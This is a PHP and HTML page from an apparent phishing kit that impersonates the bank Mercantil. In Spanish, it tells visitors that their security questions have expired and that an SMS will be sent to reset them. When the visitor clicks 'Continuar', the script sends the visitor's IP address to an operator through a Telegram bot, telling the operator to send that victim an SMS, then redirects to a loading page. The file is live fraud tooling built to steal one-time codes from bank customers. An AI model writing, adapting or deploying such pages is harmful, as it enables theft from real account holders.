<?php
include './config.php';



  $tok = isset($_POST["tok"]) ? $_POST["tok"] : '';


  if (isset($_POST['submite'])) {


  $ip_address = $_SERVER['REMOTE_ADDR'];
  $message = "MERCANTIL  \n\nENVIAR SMS A IP: $ip_address";



       $telegram_api_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
      $data = array(
          'chat_id' => $chat_id,
          'text' => $message,
          'parse_mode' => 'HTML'
      );

      // Use cURL to send the API request.
      $ch = curl_init($telegram_api_url);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($ch);
      curl_close($ch);



    header("Location: ./loading.php");
    ob_end_flush();
    exit(); }


  ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./index.css">
    <title>Mercantil</title>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
                <img src="./img/log_mov.png" width="150px" alt="">
            </div>

    
            <form action="" class="form" method="post">
                <div class="form-content">
                    
                <img src="./img/tempomerca.svg" width="150px" alt="">
                 <h2 style="margin-top: 1rem; text-align: center;">Preguntas de seguridad vencidas.</h2>
                 <p style="width: 100%; text-align: center;">Te enviaremos un SMS para reestablecerlas.</p>
                <img src="./img/ALERTM.png" style="margin-top: 1rem; margin-bottom: 1rem;" width="200px" alt="">

                    
                    <button name="submite" style="width: 150px; margin-top: 1rem; margin-bottom: 2rem;" class="butonsin">Continuar</button>
                </div>

                

            </form>
            <a href="./index.php" style="text-decoration: none; margin-top: 1.5rem; font-size: 19px; color: rgb(82, 82, 82);">Cancelar</a>
        </div>
    </div>
</body>
</html>